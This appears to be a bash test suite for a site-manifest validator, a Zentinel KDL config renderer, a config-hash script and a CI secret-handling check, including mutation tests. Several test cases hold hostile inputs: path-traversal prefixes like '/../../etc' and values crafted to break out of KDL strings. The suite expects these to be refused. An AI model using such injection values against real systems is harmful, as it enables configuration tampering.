f2 lang-slash wiki wiki.example.org /wiki 'languages = ["../x"]'; red "schema 2: a language tag that is a path is refused" "$B" check "$t/g-lang-slash"
f2 lang-nine wiki wiki.example.org /wiki 'languages = ["aa","bb","cc","dd","ee","ff","gg","hh","ii"]'; red "schema 2: nine languages are refused" "$B" check "$t/g-lang-nine"
f2 lang-nofolder wiki wiki.example.org /wiki 'languages = ["en", "fr"]'; red "schema 2: a listed language without its folder is refused" "$B" check "$t/g-lang-nofolder"
f2 lang-more wiki wiki.example.org /wiki 'default_language = "de"'; mkdir "$t/g-lang-more/en"; cp "$t/src/de/index.html" "$t/g-lang-more/en/index.html"; grn "schema 2: default language at the root, the other as a folder, passes" "$B" check "$t/g-lang-more"
f2 site-extra wiki wiki.example.org /wiki 'colour = "red"'; red "schema 2: an unknown key in [site] is refused" "$B" check "$t/g-site-extra"
rm -rf "$t/g-nosite"; cp -r "$t/src" "$t/g-nosite"; printf 'schema = 2\npurpose = "website"\n[names]\nprimary = "wiki.example.org"\n[acme]\nmethod = "http-01"\n' > "$t/g-nosite/site.toml"; red "schema 2: [site] is required" "$B" check "$t/g-nosite"
rm -rf "$t/g-v1site"; cp -r "$t/src" "$t/g-v1site"; printf '[site]\nid = "x"\n' >> "$t/g-v1site/site.toml"; red "schema 1: a [site] table is refused (needs schema 2)" "$B" check "$t/g-v1site"
rm -rf "$t/g-v1area"; cp -r "$t/src" "$t/g-v1area"; printf '[[csp.area]]\npath = "/apps"\nmode = "static"\n' >> "$t/g-v1area/site.toml"; red "schema 1: [[csp.area]] is refused (needs schema 2)" "$B" check "$t/g-v1area"
rm -rf "$t/g-v3"; cp -r "$t/src" "$t/g-v3"; sed -i 's/schema = 1/schema = 3/' "$t/g-v3/site.toml"; red "schema 3 is refused" "$B" check "$t/g-v3"
# [[csp.area]]: a policy per folder
f2 area wiki wiki.example.org /wiki '' $'[csp]\nmode = "static"\n[[csp.area]]\npath = "/apps"\nmode = "static"'; mkdir -p "$t/g-area/apps"; grn "schema 2: a csp.area with its folder passes" "$B" check "$t/g-area"
f2 area-nofolder wiki wiki.example.org /wiki '' $'[csp]\n[[csp.area]]\npath = "/apps"\nmode = "static"'; red "schema 2: a csp.area whose folder does not exist is refused" "$B" check "$t/g-area-nofolder"
f2 area-root wiki wiki.example.org /wiki '' $'[csp]\n[[csp.area]]\npath = "/"\nmode = "static"'; red "schema 2: a csp.area at the root is refused" "$B" check "$t/g-area-root"
f2 area-dotdot wiki wiki.example.org /wiki '' $'[csp]\n[[csp.area]]\npath = "/../etc"\nmode = "static"'; red "schema 2: a csp.area path with .. is refused" "$B" check "$t/g-area-dotdot"
f2 area-bs wiki wiki.example.org /wiki '' $'[csp]\n[[csp.area]]\npath = "/a\\\\b"\nmode = "static"'; red "schema 2: a csp.area path with a backslash is refused" "$B" check "$t/g-area-bs"
f2 area-dup wiki wiki.example.org /wiki '' $'[csp]\n[[csp.area]]\npath = "/apps"\nmode = "static"\n[[csp.area]]\npath = "/apps"\nmode = "static"'; mkdir -p "$t/g-area-dup/apps"; red "schema 2: a csp.area path twice is refused" "$B" check "$t/g-area-dup"
many=$'[csp]'; for i in 1 2 3 4 5 6 7 8 9; do many+=$'\n[[csp.area]]\npath = "/a'$i$'"\nmode = "static"'; done
f2 area-nine wiki wiki.example.org /wiki '' "$many"; for i in 1 2 3 4 5 6 7 8 9; do mkdir -p "$t/g-area-nine/a$i"; done; red "schema 2: nine csp.area entries are refused (at most 8)" "$B" check "$t/g-area-nine"
f2 area-key wiki wiki.example.org /wiki '' $'[csp]\n[[csp.area]]\npath = "/apps"\nmode = "static"\nscript = "x"'; mkdir -p "$t/g-area-key/apps"; red "schema 2: an unknown key in csp.area is refused" "$B" check "$t/g-area-key"
f2 area-nomode wiki wiki.example.org /wiki '' $'[csp]\n[[csp.area]]\npath = "/apps"'; mkdir -p "$t/g-area-nomode/apps"; red "schema 2: a csp.area without mode is refused" "$B" check "$t/g-area-nomode"
f2 area-quote wiki wiki.example.org /wiki '' $'[csp]\n[[csp.area]]\npath = "/apps"\nmode = "static"\npolicy = "a\\"b"'; mkdir -p "$t/g-area-quote/apps"; red "schema 2: a csp.area policy with a quote is refused" "$B" check "$t/g-area-quote"
f2 area-pass wiki wiki.example.org /wiki '' $'[csp]\n[[csp.area]]\npath = "/apps"\nmode = "passthrough"'; mkdir -p "$t/g-area-pass/apps"
red "schema 2: an area in passthrough makes the site a passthrough site: a static check refuses it" "$B" check "$t/g-area-pass"
grn "schema 2: the same folder passes the check with --passthrough" "$B" --passthrough check "$t/g-area-pass"
grn "the example templates/site/site.example.toml is a valid schema 2 file (and in a folder with its area folder it passes the check)" bash -c "python3 -I '$here/site_manifest.py' '$T/site.example.toml' && rm -rf '$t/g-example' && cp -r '$t/src' '$t/g-example' && cp '$T/site.example.toml' '$t/g-example/site.toml' && mkdir '$t/g-example/apps' && '$B' check '$t/g-example'"
# render: several sites; the same name under different prefixes
mk2 "$t/v-land.toml" landing example.org / 'name = "Landing"'; mk2 "$t/v-wiki.toml" wiki example.org /wiki; mk2 "$t/v-help.toml" help help.example.org /
grn "render schema 2: two sites on one host with different prefixes, one certificate for the name" bash -c "'$R' --site '$t/v-land.toml' --site '$t/v-wiki.toml' --site '$t/v-help.toml' '$t/v.kdl' >/dev/null 2>&1 && [ \$(grep -c 'acme {' '$t/v.kdl') = 2 ] && [ \$(grep -c 'domains \"example.org\"' '$t/v.kdl') = 1 ] && grep -q 'root \"/srv/www/wiki/mount\"' '$t/v.kdl' && grep -q 'root \"/srv/www/landing/current\"' '$t/v.kdl' && grep -q 'path-prefix \"/wiki\"' '$t/v.kdl'"
grn "render schema 2: the route of the longer prefix comes first (/wiki before /)" bash -c "[ \$(grep -n 'root \"/srv/www/wiki/mount\"' '$t/v.kdl' | head -1 | cut -d: -f1) -lt \$(grep -n 'root \"/srv/www/landing/current\"' '$t/v.kdl' | head -1 | cut -d: -f1) ]"
# Zentinel 26.11_2 does not cut the path-prefix before the file lookup (measured: /wiki/ gives <root>/wiki/index.html): a site with a prefix gets the root `mount` (the delivery step links mount/<prefix> to ../current), a site at / gets `current`
grn "render schema 2: the route of /wiki has the root <id>/mount (the prefix is not cut), the site at / keeps current" bash -c "grep -A8 'path-prefix \"/wiki\"' '$t/v.kdl' | grep -q 'root \"/srv/www/wiki/mount\"' && ! grep -q 'wiki/current' '$t/v.kdl' && grep -A8 'path-prefix \"/\"' '$t/v.kdl' | grep -q 'root \"/srv/www/landing/current\"'"
mk2 "$t/v-deep2.toml" deep2 example.org /a/b; grn "render schema 2: a two-segment prefix gets the root mount too" bash -c "'$R' --site '$t/v-deep2.toml' '$t/d2.kdl' >/dev/null 2>&1 && grep -q 'root \"/srv/www/deep2/mount\"' '$t/d2.kdl'"
mk2 "$t/v-ar-out.toml" outer example.org / '' $'[csp]\n[[csp.area]]\npath = "/apps"\nmode = "static"'
mk2 "$t/v-ar-in.toml" inner example.org /apps; mk2 "$t/v-ar-in2.toml" inner2 example.org /apps2
red "render schema 2: an inner site exactly on a csp.area of the outer site (two equal routes) is refused" "$R" --site "$t/v-ar-out.toml" --site "$t/v-ar-in.toml" "$t/x.kdl"
red "render schema 2: the same, the other way round in the list, is refused" "$R" --site "$t/v-ar-in.toml" --site "$t/v-ar-out.toml" "$t/x.kdl"
grn "render schema 2: an inner site next to the area (/apps2) passes (control)" "$R" --site "$t/v-ar-out.toml" --site "$t/v-ar-in2.toml" "$t/x.kdl"
grn "render schema 2: same input, same bytes" bash -c "'$R' --site '$t/v-land.toml' --site '$t/v-wiki.toml' '$t/v1.kdl' >/dev/null 2>&1 && '$R' --site '$t/v-land.toml' --site '$t/v-wiki.toml' '$t/v2.kdl' >/dev/null 2>&1 && cmp '$t/v1.kdl' '$t/v2.kdl'"
mk2 "$t/v-wiki2.toml" wiki2 example.org /wiki; red "render schema 2: the same name with the same prefix is refused" "$R" --site "$t/v-wiki.toml" --site "$t/v-wiki2.toml" "$t/x.kdl"
mk2 "$t/v-wikib.toml" wiki other.example.org /; red "render schema 2: the same id (directory) twice is refused" "$R" --site "$t/v-wiki.toml" --site "$t/v-wikib.toml" "$t/x.kdl"
mk2 "$t/v-wikip.toml" wikip example.org /wikipedia; grn "render schema 2: /wiki and /wikipedia are not nested (segment boundary)" "$R" --site "$t/v-wiki.toml" --site "$t/v-wikip.toml" "$t/x.kdl"
mk2 "$t/v-de.toml" dede example.org /de; red "render schema 2: an inner site at /de is refused when the outer site generates a /de folder (its language)" "$R" --site "$t/v-land.toml" --site "$t/v-de.toml" "$t/x.kdl"
mk2 "$t/v-sm.toml" smx example.org /sitemap.xml; red "render schema 2: an inner site taking sitemap.xml is refused" "$R" --site "$t/v-land.toml" --site "$t/v-sm.toml" "$t/x.kdl"
mk2 "$t/v-deep.toml" deep example.org /wiki/en; red "render schema 2: a site below /wiki/en is refused when /wiki generates an en folder" "$R" --site "$t/v-wiki.toml" --site "$t/v-deep.toml" "$t/x.kdl"
mk2 "$t/v-inj.toml" inj example.org '/a\"; }'; red "render schema 2: a prefix that tries to break out of the KDL string is refused" "$R" --site "$t/v-inj.toml" "$t/x.kdl"
mk2 "$t/v-injid.toml" 'a\" {' example.org /x; red "render schema 2: an id that tries to break out of the KDL string is refused" "$R" --site "$t/v-injid.toml" "$t/x.kdl"
mk2 "$t/v-dd.toml" up example.org '/../../etc'; red "render schema 2: a prefix with .. is refused" "$R" --site "$t/v-dd.toml" "$t/x.kdl"
mk2 "$t/v-bs.toml" bs example.org '/a\\b'; red "render schema 2: a prefix with a backslash is refused" "$R" --site "$t/v-bs.toml" "$t/x.kdl"
grn "render: a schema 1 and a schema 2 site together (directory by primary, by id)" bash -c "'$R' --site '$t/s1.toml' --site '$t/v-wiki.toml' '$t/m.kdl' >/dev/null 2>&1 && grep -q 'root \"/srv/www/one.example.org/current\"' '$t/m.kdl' && grep -q 'root \"/srv/www/wiki/mount\"' '$t/m.kdl'"
mk2 "$t/v-area.toml" apps apps.example.org /app '' $'[csp]\n[[csp.area]]\npath = "/own"\nmode = "passthrough"\npolicy = "default-src \'self\'; script-src \'self\'"'
red "render schema 2: an area in passthrough is refused without --allow-passthrough" "$R" --site "$t/v-area.toml" "$t/x.kdl"
grn "render schema 2: with --allow-passthrough the area gets its own route and CSP, the rest stays strict" bash -c "'$R' --allow-passthrough --site '$t/v-area.toml' '$t/a.kdl' 2>'$t/wa' >/dev/null && grep -q 'path-prefix \"/app/own\"' '$t/a.kdl' && grep -q \"script-src 'self'\" '$t/a.kdl' && [ \$(grep -c \"default-src 'none'\" '$t/a.kdl') = 1 ] && grep -q WARNING '$t/wa'"
# mutations of the manifest reader (on a copy of scripts/ and templates/site/)
mutset=$(mktemp -d); mkdir -p "$mutset/scripts" "$mutset/templates"; cp -r "$T" "$mutset/templates/site"
mutm() { cp "$here/site_manifest.py" "$mutset/scripts/site_manifest.py"; sed -i "$1" "$mutset/scripts/site_manifest.py"; if cmp -s "$here/site_manifest.py" "$mutset/scripts/site_manifest.py"; then bad "mutation $2: the sed did not apply"; fi; }
mutm 's/if pa == pb:/if False:/' sameprefix
grn "mutation control: without the same-prefix rule the same name and prefix is GREEN" "$mutset/templates/site/render.sh" --site "$t/v-wiki.toml" --site "$t/v-wiki2.toml" "$t/x.kdl"
mutm 's/if a\["dir"\] == b\["dir"\]:/if False:/' samedir
grn "mutation control: without the same-directory rule two sites in one directory are GREEN" "$mutset/templates/site/render.sh" --site "$t/v-wiki.toml" --site "$t/v-wikib.toml" "$t/x.kdl"
mutm 's/if below in GENERATED | set(outer\["languages"\]):/if False:/' generated
grn "mutation control: without the generated-names rule /de over a /de language folder is GREEN" "$mutset/templates/site/render.sh" --site "$t/v-land.toml" --site "$t/v-de.toml" "$t/x.kdl"
mutm 's/^SEGMENT = .*/SEGMENT = re.compile(r"[a-z0-9._-]+")/; s/ or any(x in (".", "..") for x in segs)//' dotdot
grn "mutation control: without the segment and .. rules the prefix /../../etc is GREEN" "$mutset/templates/site/render.sh" --site "$t/v-dd.toml" "$t/x.kdl"
mutm 's/^SEGMENT = .*/SEGMENT = re.compile(r"[a-z0-9._\\\\-]+")/' backslash
grn "mutation control: with a backslash allowed in a segment the backslash prefix is GREEN" "$mutset/templates/site/render.sh" --site "$t/v-bs.toml" "$t/x.kdl"
mutm 's/^                if pa != pb and same:$/                if False:/' areaplace
grn "mutation control: without the equal-place rule an inner site on a csp.area is GREEN" "$mutset/templates/site/render.sh" --site "$t/v-ar-out.toml" --site "$t/v-ar-in.toml" "$t/x.kdl"
cp "$T/render.py" "$mutset/templates/site/render.py"; sed -i 's/("current" if s\["path_prefix"\] == "\/" else "mount")/"current"/' "$mutset/templates/site/render.py"
cmp -s "$T/render.py" "$mutset/templates/site/render.py" && bad "mutation rootmount: the sed did not apply"
red "mutation: with the root always current the /wiki mount test is found" bash -c "'$mutset/templates/site/render.sh' --site '$t/v-wiki.toml' '$t/mm.kdl' >/dev/null 2>&1 && grep -q 'root \"/srv/www/wiki/mount\"' '$t/mm.kdl'"
rm -rf "$mutset"
# H4: the hash of the Zentinel configuration in the sign job (scripts/site-kdl-hash.sh) depends on site.toml AND on ACME_EMAIL, WEBROOT, HTTP_ADDR, HTTPS_ADDR; fixed values, same hash twice
K="$here/site-kdl-hash.sh"; TB="$t/dist/helfa.org-0.0.1-site.tar.gz"
kh() { env -u WEBROOT -u HTTP_ADDR -u HTTPS_ADDR ACME_EMAIL=admin@example.org "$@"; }
kdiff() { # script var value: the hashes differ from the default run when VAR is set (0 = they differ)
  local s=$1 v=$2 val=$3
  [ "$(kh "$s" "$TB" | grep '^kdl-sha256 staging')" != "$(kh env "$v=$val" "$s" "$TB" | grep '^kdl-sha256 staging')" ]; }
grn "kdl hash: prints the inputs and one hash per variant" bash -c "'$K' '$TB' >/dev/null 2>&1 || true; ACME_EMAIL=admin@example.org '$K' '$TB' | grep -q '^kdl-inputs webroot=/srv/www http-addr=0.0.0.0:80 https-addr=0.0.0.0:443 acme-email=admin@example.org' && [ \$(ACME_EMAIL=admin@example.org '$K' '$TB' | grep -c '^kdl-sha256 ') = 3 ]"
grn "kdl hash: same inputs, same output (twice)" bash -c "export ACME_EMAIL=admin@example.org; [ \"\$('$K' '$TB')\" = \"\$('$K' '$TB')\" ]"
grn "kdl hash: the documented defaults are the real ones (set explicitly, the output is identical)" bash -c "export ACME_EMAIL=admin@example.org; unset WEBROOT HTTP_ADDR HTTPS_ADDR; a=\$('$K' '$TB'); b=\$(WEBROOT=/srv/www HTTP_ADDR=0.0.0.0:80 HTTPS_ADDR=0.0.0.0:443 '$K' '$TB'); [ \"\$a\" = \"\$b\" ]"
grn "kdl hash: another WEBROOT gives another hash" kdiff "$K" WEBROOT /var/www
grn "kdl hash: another HTTP_ADDR gives another hash" kdiff "$K" HTTP_ADDR 0.0.0.0:8080
grn "kdl hash: another HTTPS_ADDR gives another hash" kdiff "$K" HTTPS_ADDR 0.0.0.0:8443
grn "kdl hash: another ACME_EMAIL gives another hash" bash -c "[ \"\$(ACME_EMAIL=a@example.org '$K' '$TB' | grep staging)\" != \"\$(ACME_EMAIL=b@example.org '$K' '$TB' | grep staging)\" ]"
red "kdl hash: without ACME_EMAIL it is red (no hash from nothing)" env -u ACME_EMAIL "$K" "$TB"
red "kdl hash: a passthrough tarball needs --allow-passthrough" env ACME_EMAIL=admin@example.org "$K" "$t/dpt/helfa.org-0.0.1-site.tar.gz"
grn "kdl hash: with --allow-passthrough the passthrough tarball gets its hashes" env ACME_EMAIL=admin@example.org "$K" "$t/dpt/helfa.org-0.0.1-site.tar.gz" --allow-passthrough
grn "kdl hash: the person's render (render.sh from main, same site.toml, same values) gives the same production hash" bash -c "d=\$(mktemp -d); tar -xzf '$TB' -C \$d ./site.toml; ACME_EMAIL=admin@example.org '$R' --production --site \$d/site.toml \$d/p.kdl >/dev/null 2>&1; h=\$(cut -d' ' -f1 \$d/p.kdl.sha256); rm -rf \$d; ACME_EMAIL=admin@example.org '$K' '$TB' | grep -q \"^kdl-sha256 production \$h\$\""
mkdir -p "$t/mutk/scripts" "$t/mutk/templates"; cp -r "$T" "$t/mutk/templates/site"; cp "$here"/site_manifest.py "$t/mutk/scripts/"; cp "$K" "$t/mutk/scripts/site-kdl-hash.sh"
sed -i 's#^export WEBROOT=\${WEBROOT:-/srv/www} #export WEBROOT=/srv/www #' "$t/mutk/scripts/site-kdl-hash.sh"
cmp -s "$K" "$t/mutk/scripts/site-kdl-hash.sh" && bad "mutation kdl hash: the sed did not apply"
red "mutation: a script that ignores WEBROOT is found by the WEBROOT test" kdiff "$t/mutk/scripts/site-kdl-hash.sh" WEBROOT /var/www
# H3: the step that holds the secrets starts no other process (builtins only: set, umask, assignment, printf with redirection), the folder is made by an earlier step
cat > "$t/secretstep.py" <<'PY'
import re, sys, yaml
doc = yaml.safe_load(open(sys.argv[1]))
ok = [re.compile(x) for x in (r"set -euo pipefail", r"umask 077", r'd="\$RUNNER_TEMP/site-key"', r"printf '%s' \"\$GPG_[A-Z_]+\" > \"\$d/[a-z.]+\"")]
steps = [st for job in doc["jobs"].values() for st in job.get("steps", []) if "secrets.GPG_PRIVATE_KEY" in str(st.get("env", ""))]
if len(steps) != 1:
    sys.exit(f"{len(steps)} steps hold the secret (exactly one expected)")
bad = [ln for ln in map(str.strip, steps[0]["run"].splitlines()) if ln and not ln.startswith("#") and not any(r.fullmatch(ln) for r in ok)]
if bad:
    sys.exit("not a builtin-only line: " + "; ".join(bad))
mk = [st for job in doc["jobs"].values() for st in job.get("steps", []) if "mkdir -m 700" in st.get("run", "")]
if len(mk) != 1 or "secrets." in str(mk[0].get("env", "")):
    sys.exit("the folder must be made by a step without secrets")
PY
if python3 -c 'import yaml' 2>/dev/null; then
  grn "site.yml: the step with the secrets runs builtins only, the folder is made before by a step without secrets" python3 -I "$t/secretstep.py" "$root/.github/workflows/site.yml"
  sed 's#^          d="\$RUNNER_TEMP/site-key"$#          d="$RUNNER_TEMP/site-key"; mkdir -m 700 "$d"#' "$root/.github/workflows/site.yml" > "$t/site-mut.yml"
  cmp -s "$t/site-mut.yml" "$root/.github/workflows/site.yml" && bad "mutation site.yml: the sed did not apply"
  red "mutation: an external mkdir in the step with the secrets is found" python3 -I "$t/secretstep.py" "$t/site-mut.yml"
else echo "skip site.yml secret-step test (no PyYAML)"; fi
if [ -n "${ZENTINEL_BIN:-}" ]; then for f in s p h; do grn "zentinel test -c on the rendering $f" "$ZENTINEL_BIN" test -c "$t/$f.kdl"; done; fi
exit "$fail"
